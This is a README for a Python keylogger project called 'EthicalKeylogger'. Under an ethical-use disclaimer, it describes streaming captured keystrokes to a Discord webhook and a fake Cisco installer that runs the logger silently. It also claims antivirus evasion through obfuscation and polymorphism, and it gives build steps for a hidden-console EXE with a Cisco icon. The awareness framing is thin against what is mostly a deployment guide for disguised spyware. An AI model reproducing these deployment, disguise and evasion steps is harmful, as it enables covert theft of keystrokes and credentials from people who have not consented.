# EthicalKeylogger <img align="right" height="170" src="https://moonlock.com/2023/09/Keylogger-analysis-header.png" alt="banner" />

![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)
![Status: Proof of Concept](https://img.shields.io/badge/status-POC-orange.svg)

> **🛑 Read first — Ethical‑use statement**  
> This repository exists **only** to teach, audit, and raise awareness of how easily untrusted software can capture keystrokes.  
> Deploying a keylogger **without the explicit, informed consent of every user** is illegal in many jurisdictions and an egregious invasion of privacy. By cloning or executing any code herein, you accept full responsibility for complying with all laws and ethical guidelines.

---

## Table of Contents
1. [Project Goals](#project-goals)  
2. [Features](#features)  
3. [Quick Start](#quick-start)  
4. [Building a Stand‑alone EXE](#building-a-stand-alone-exe)  
5. [Configuration Reference](#configuration-reference)  
6. [Contributing](#contributing)  
7. [License](#license)  
8. [Disclaimer](#disclaimer)  

---

## Project Goals

* **Demonstration** – Provide a minimal, readable code base that shows how keystrokes can be captured and exfiltrated.  
* **Awareness** – Help security trainers illustrate social‑engineering tactics with a *fake Cisco installer* that silently runs the logger.  
* **Research** – Offer security researchers a playground for AV‑evasion experiments (≈ 87 % bypass against 70 engines in‑house; results vary).  
* **Education** – Encourage best practices such as application whitelisting, code signing, and least‑privilege execution.  

---

## Features

| Category | Details |
|----------|---------|
| **Keystroke Capture** | Logs every key press for a user‑specified duration. |
| **Interactive Report** | Generates a self‑contained HTML file (`report.html`) with timestamps, frequency charts, and search. |
| **Discord Webhook** | (Optional) Streams live keystrokes to a Discord channel for identity correlation. |
| **Stealth Installer** | Bundled “Cisco Setup.exe” mock‑installer demonstrates social‑engineering vectors. |
| **AV Evasion POC** | Simple obfuscation modules achieve high signature‑bypass rates (subject to change). |

---

## Quick Start

> **Prerequisites**  
> • Python 3.8 or later  
> • `pip`, `git`

```bash

git clone https://github.com/waaashed/EthicalKeylogger.git
cd Keylogger_s0d3ep

pip install -r requirements.txt

nano keylogger.py # or your favourite editor

python keylogger.py
```

When the timer expires, an **`report.html`** file will appear in the project root. Open it in any modern browser to explore your captured keystrokes.

---

## Building a Stand‑alone EXE

> Windows‑only; bundling hides the source and eases distribution for demos.

1. **Install Auto PY to EXE**

   ```bash
   pip install auto-py-to-exe
   ```

2. **Launch the GUI**

   ```bash
   auto-py-to-exe
   ```

3. **Configure Build**
   * Script: `keylogger.py`  
   * Mode: **One‑file**  
   * Additional → `--noconsole` (optional stealth)  
   * Icon: `assets/cisco.ico` (optional)  

4. Click **Convert .py to .exe**.  
   The resulting binary is placed in `output/`.

![Auto PY to EXE GIF](https://s13.gifyu.com/images/S0BmI.gif)

---

## Configuration Reference

Open **`keylogger.py`** and adjust the constants at the top:

```python
# ── Basic settings ────────────────────────────────────────────
RECORD_DURATION = 10          # Seconds the logger will run
HTML_REPORT     = True        # Toggle HTML generation

# ── Discord webhook (optional) ─────────────────────────────────
WEBHOOK_URL     = ""          # Paste your Discord webhook URL
WEBHOOK_CHUNK   = 50          # Send a message every N keystrokes

# ── AV evasion tweaks (experimental) ──────────────────────────
USE_OBFUSCATION = True        # Enable junk code injection
POLYMORPH_DELAY = 120         # Seconds before morphing stub
```

*Leaving `WEBHOOK_URL` empty disables all network exfiltration.*


---

## Disclaimer

This software is provided **“as is”, without warranty of any kind**. The authors and contributors are **not liable for any damages** or legal consequences arising from its use or misuse. By using this project you acknowledge that **all responsibility rests solely with you**.
